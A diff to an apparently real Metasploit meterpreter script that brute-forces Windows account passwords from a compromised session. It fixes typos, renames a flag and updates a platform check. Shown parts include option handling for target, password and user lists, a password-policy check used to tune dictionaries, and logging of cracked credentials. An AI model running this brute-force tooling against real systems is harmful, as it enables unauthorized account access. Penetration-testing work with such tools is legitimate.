@@ -1,6 +1,6 @@
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -12,7 +12,7 @@
   "-h"  => [ false,  "\tHelp menu."],
   "-t"  => [ true,  "\tTarget IP Address"],
   "-p"  => [ true,  "\tPassword List"],
-  "-cp" => [ false,  "\tCheck Local Machine Password Policy"],
+  "-c" => [ false,  "\tCheck Local Machine Password Policy"],
   "-L"  => [ true,  "\tUsername List to be brute forced"],
   "-l"  => [ true,  "\tLogin name to be brute forced"]
 )
@@ -31,7 +31,7 @@ session = client
 ################## Function Definition ##################
 # Function for checking the password policy of current system.
 # This policy may resemble the policy of other servers in the
-#target enviroment.
+#target environment.
 def chkpolicy(session)
   print_status("Checking password policy...")
   output = []
@@ -54,11 +54,11 @@ def chkpolicy(session)
       print_status "\tWARNING Lockout threshold configured, if #{lockout} attempts in #{failcount} minutes account will be locked"
       print_status "\tThe account will be locked out for #{lcktime}"
     end
-    # check for password lenght
+    # check for password length
     if minpass.to_s == "0"
-      print_status "\tNo minimun password lenght is configured"
+      print_status "\tNo minimum password length is configured"
     else
-      print_status "\tThe minumun password lengh configured is #{minpass}"
+      print_status "\tThe minimum password length configured is #{minpass}"
       print_status "\tyour dictionary should start with passwords of #{minpass} length"
     end
   rescue ::Exception => e
@@ -70,7 +70,7 @@ end
 # Function for brute forcing passwords using windows native tools
 def passbf(session,passlist,target,user,opt,logfile)
   print_status("Running Brute force attack against #{user}")
-  print_status("Successfull Username and Password pairs are being saved in #{logfile}")
+  print_status("Successful Username and Password pairs are being saved in #{logfile}")
   result = []
   output = []
   passfnd = 0
@@ -78,7 +78,7 @@ def passbf(session,passlist,target,user,opt,logfile)
   i = 0
   if opt == 1
     if not ::File.exist?(user)
-      raise "Usernames List File does not exists!"
+      raise "Usernames List File does not exist!"
     else
       user = ::File.open(user, "r")
     end
@@ -150,7 +150,7 @@ def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-unsupported if client.platform !~ /win32|win64/i
+unsupported if client.platform != 'windows'
 
 ################## MAIN ##################
 
@@ -164,14 +164,14 @@ unsupported if client.platform !~ /win32|win64/i
     userlist = val
     ulopt = 1
 
-  when "-cp"
+  when "-c"
     chkpolicy(session)
     exit
   when "-p"
 
     passlist = val
     if not ::File.exist?(passlist)
-      raise "Password File does not exists!"
+      raise "Password File does not exist!"
     end
   when "-t"
     target = val
